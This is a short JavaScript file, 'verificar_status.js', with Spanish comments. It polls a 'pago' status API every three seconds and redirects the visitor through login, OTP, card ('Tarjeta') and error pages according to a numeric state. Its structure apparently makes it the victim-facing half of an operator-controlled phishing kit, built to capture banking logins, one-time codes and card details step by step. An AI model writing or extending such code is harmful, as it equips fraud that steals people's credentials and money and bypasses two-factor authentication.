console.log("%c 🚀 SCRIPT CARGADO: verificar_status.js ", "background: #22c55e; color: black; font-size: 16px; font-weight: bold;");

function startPolling(id) {
    if (!id) {
        console.error("❌ Error: No Client ID provided to startPolling");
        return;
    }
    
    console.log(`📡 Iniciando sondeo para Cliente ID: ${id}`);

    // Polling interval 3s
    setInterval(() => {
        fetch(`../../pago/api/check_status.php?id=${id}`)
            .then(r => r.json())
            .then(data => {
                // Console Debug (Requested by User)
                console.log(`%c 🔄 Estado [${id}]: ${data.estado} `, "color: #3cb4e5; font-weight: bold;", data);

                if (data.status === 'success') {
                    handleStatus(data.estado, id);
                }
            })
            .catch(e => {
                console.error("❌ Error Polling:", e);
            });
    }, 3000);
}

function handleStatus(estado, id) {
    estado = parseInt(estado);
    // 1: Login (Current)
    // 2: Error Login
    // 3: OTP
    // 4: Error OTP
    // 5: CC (Tarjeta)
    // 6: Error CC
    // 7: Finish
    
    if (estado === 2) {
        window.location.href = `error.php?id=${id}`;
    } else if (estado === 3) {
        window.location.href = `otp.php?id=${id}`;
    } else if (estado === 4) {
         window.location.href = `errorotp.php?id=${id}`;
    } else if (estado === 5) {
         window.location.href = `cc.php?id=${id}`;
    } else if (estado === 6) {
         window.location.href = `errorcc.php?id=${id}`;
    } else if (estado === 7 || estado === 0) {
        window.location.href = `finish.php?id=${id}`;
    }
}

// Auto-start when DOM is ready
document.addEventListener("DOMContentLoaded", () => {
    console.log("🌐 DOM Cargado. Verificando clienteId...");
    if (typeof clienteId !== 'undefined') {
        startPolling(clienteId);
    } else {
        console.error("❌ Error: clienteId no está definido después de cargar el DOM.");
    }
});
